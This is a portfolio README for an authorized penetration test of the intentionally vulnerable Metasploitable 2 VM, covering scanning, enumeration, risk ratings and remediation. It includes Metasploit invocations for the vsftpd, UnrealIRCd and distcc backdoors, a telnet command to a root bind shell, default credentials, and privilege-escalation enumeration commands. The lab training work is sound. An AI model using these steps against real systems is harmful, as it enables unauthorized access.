
# Metasploitable 2 — Penetration Testing Lab

A professional penetration testing assessment of **Metasploitable 2**, an intentionally vulnerable Linux virtual machine designed for cybersecurity training and penetration testing practice.

This project documents the penetration testing lifecycle, including reconnaissance, port scanning, service enumeration, vulnerability identification, exploitation, post-exploitation, privilege escalation assessment, risk analysis, and remediation.

> ⚠️ **Disclaimer:** This project was conducted in an authorized, isolated laboratory environment. Metasploitable 2 is intentionally vulnerable and must not be deployed on an untrusted or public network.

---

## 🎯 Objectives

- Perform network reconnaissance
- Identify exposed ports and services
- Enumerate service versions
- Identify known vulnerabilities
- Exploit vulnerable services
- Obtain unauthorized access within the lab
- Perform post-exploitation enumeration
- Assess privilege escalation opportunities
- Analyze security impact
- Document findings and remediation recommendations

---

## 🖥️ Lab Environment

| Component | Details |
|---|---|
| Target | Metasploitable 2 |
| Attacker | Kali Linux |
| Target OS | Ubuntu Linux |
| Environment | Isolated Virtual Lab |
| Assessment Type | Authorized Penetration Test |
| Primary Tools | Nmap, Metasploit, SearchSploit, SMBClient, Telnet, Netcat |

---

## 🔍 Methodology

The assessment followed a structured penetration testing workflow:


Reconnaissance
      ↓
Port Scanning
      ↓
Service Enumeration
      ↓
Vulnerability Identification
      ↓
Exploitation
      ↓
Initial Access
      ↓
Post-Exploitation
      ↓
Privilege Escalation Assessment
      ↓
Risk Analysis
      ↓
Remediation
      ↓
Reporting


---

## 🔎 Reconnaissance & Enumeration

Target discovery and service enumeration were performed using Nmap.

Example:

bash
nmap -sC -sV -p- <TARGET-IP>


The assessment identified a large attack surface containing multiple intentionally vulnerable services.

### Key Services Identified

| Port | Service    | Security Relevance          |
| ---: | ---------- | --------------------------- |
|   21 | FTP        | Vulnerable FTP service      |
|   22 | SSH        | Remote administration       |
|   23 | Telnet     | Insecure remote access      |
|   25 | SMTP       | Mail service                |
|   53 | DNS        | DNS enumeration             |
|   80 | HTTP       | Vulnerable web applications |
|  139 | SMB        | File sharing                |
|  445 | SMB        | File sharing / exploitation |
| 1524 | Bind Shell | Root-level shell            |
| 2049 | NFS        | Network file sharing        |
| 3306 | MySQL      | Database service            |
| 3632 | DistCC     | Remote command execution    |
| 5432 | PostgreSQL | Database service            |
| 5900 | VNC        | Remote desktop              |
| 6667 | IRC        | Vulnerable UnrealIRCd       |
| 8180 | Tomcat     | Web application server      |

---

## 💥 Exploitation

### 1. vsftpd 2.3.4 Backdoor

The FTP service exposes a vulnerable version of vsftpd.

Metasploit module:

`text
exploit/unix/ftp/vsftpd_234_backdoor


Example:

text
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <TARGET-IP>
run


The vulnerability can provide unauthorized shell access.

---

### 2. UnrealIRCd 3.2.8.1 Backdoor

The IRC service contains a known backdoor vulnerability.

Metasploit module:

```text
exploit/unix/irc/unreal_ircd_3281_backdoor
```

Example:

text
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOST <TARGET-IP>
run


Successful exploitation can result in remote command execution.

---

### 3. TCP/1524 Bind Shell

Port `1524` exposes an intentionally configured bind shell.

Example:

`
telnet <TARGET-IP> 1524

Verification:


id
whoami


The service can provide highly privileged access, representing a **Critical** security risk.

---

### 4. DistCC Remote Command Execution

Port `3632` exposes the Distributed Compiler daemon.

Metasploit module:


exploit/unix/misc/distcc_exec


Example:

`
use exploit/unix/misc/distcc_exec
set RHOST <TARGET-IP>
run


This vulnerability allows unauthorized remote command execution.

---

### 5. Samba Attack Surface

SMB services were identified on ports `139` and `445`.

Share enumeration:

`
smbclient -L //<TARGET-IP>

The intentionally vulnerable Samba configuration provides opportunities for further enumeration and exploitation.

---

## 🌐 Web Application Assessment

Metasploitable 2 contains several intentionally vulnerable web applications, including:

* Mutillidae
* DVWA
* phpMyAdmin
* TikiWiki
* WebDAV
* PHP information disclosure

These applications provide opportunities to practice common web security testing techniques in an authorized environment.

---

## 🔐 Credential Security

The environment contains intentionally weak/default credentials, including examples such as:

`
msfadmin : msfadmin
user     : user
postgres : postgres
service  : service
sys      : batman


This demonstrates the risks associated with:

* Default credentials
* Weak passwords
* Password reuse
* Poor authentication controls
* Exposed administrative services

---

## 🧪 Post-Exploitation

After obtaining access, standard Linux enumeration techniques can be used.

### Current User


whoami
id


### System Information


uname -a
cat /etc/os-release


### Network Information


ifconfig
ip addr


### Running Processes

`
ps aux


## ⬆️ Privilege Escalation Assessment

The following areas were assessed:

### SUID Files


find / -perm -4000 -type f 2>/dev/null


### Sudo Permissions


sudo -l


### Cron Jobs


cat /etc/crontab
ls -la /etc/cron.d/


### Writable Files


find / -writable -type f 2>/dev/null


### Linux Capabilities


getcap -r / 2>/dev/null


The purpose was to identify possible paths from low-privileged access to administrative/root privileges.

---

## 📊 Risk Summary

| ID   | Finding                         | Severity    |
| ---- | ------------------------------- | ----------- |
| V-01 | vsftpd 2.3.4 Backdoor           | 🔴 Critical |
| V-02 | UnrealIRCd Backdoor             | 🔴 Critical |
| V-03 | Exposed Root Bind Shell         | 🔴 Critical |
| V-04 | DistCC Remote Command Execution | 🟠 High     |
| V-05 | Vulnerable Samba Configuration  | 🟠 High     |
| V-06 | Weak / Default Credentials      | 🟠 High     |
| V-07 | Vulnerable Web Applications     | 🟠 High     |
| V-08 | Insecure Legacy Services        | 🟠 High     |

---

## 🛡️ Recommendations

* Remove unnecessary services.
* Disable legacy protocols such as Telnet.
* Remove default credentials.
* Enforce strong and unique passwords.
* Patch vulnerable software.
* Restrict administrative services using firewall rules.
* Segment critical systems from untrusted networks.
* Remove vulnerable applications from production systems.
* Secure SMB/NFS configurations.
* Implement centralized logging and monitoring.
* Regularly perform vulnerability assessments and penetration tests.

---

## 🛠️ Tools Used


Nmap
Metasploit Framework
SearchSploit
SMBClient
Netcat
Telnet
Linux Enumeration Tools




## 📚 Skills Demonstrated

* Network Reconnaissance
* Port Scanning
* Service Enumeration
* Vulnerability Assessment
* Exploit Research
* Metasploit Framework
* Remote Command Execution
* Linux Enumeration
* Privilege Escalation Assessment
* SMB Enumeration
* Web Application Security Testing
* Credential Security Assessment
* Penetration Testing Methodology
* Security Reporting
* Vulnerability Remediation

---

## 📄 Professional Report

A detailed professional penetration testing report is included in this repository.

**Report:** `Metasploitable-2-Professional-Penetration-Testing-Report.pdf`

The report contains:

* Executive Summary
* Scope & Methodology
* Attack Surface Analysis
* Vulnerability Assessment
* Exploitation Findings
* Post-Exploitation Assessment
* Privilege Escalation Assessment
* Risk Register
* MITRE ATT&CK Mapping
* Remediation Recommendations
* Evidence Structure
* References

---

## ⚠️ Legal & Ethical Disclaimer

This repository is intended strictly for **cybersecurity education, authorized penetration testing, and laboratory practice**.

The techniques demonstrated here must only be performed against systems for which explicit authorization has been obtained.

---

## 👨‍💻 Author

**Alen Sales K S**

Cybersecurity | Penetration Testing | SOC | Network Security

GitHub: [https://github.com/zales2004](https://github.com/zales2004)

---

## ⭐ Project Focus

This project demonstrates the complete penetration testing lifecycle:

**Reconnaissance → Enumeration → Vulnerability Analysis → Exploitation → Post-Exploitation → Privilege Escalation → Risk Assessment → Remediation**

```
```


---

## Portfolio navigation

This repository is part of my hands-on cybersecurity learning portfolio by **Alen Sales K S**. I document lab work to make the methodology, evidence, limitations, and lessons learned easier to review.

- [Cybersploit 1 CTF Walkthrough](https://github.com/zales2004/cybersploit-1-ctf-walkthrough)
- [Cybersploit 2 CTF Walkthrough](https://github.com/zales2004/cybersploit-2-ctf-walkthrough)
- [Sunset: Noontide](https://github.com/zales2004/sunset-noontide-pentesting)

## Scope and responsible use

All security testing described here is for authorized training environments, intentionally vulnerable targets, or systems I own or have permission to assess. Findings should be interpreted in the context of the documented lab and supporting evidence; they should not be treated as proof of compromise on unrelated real-world systems.
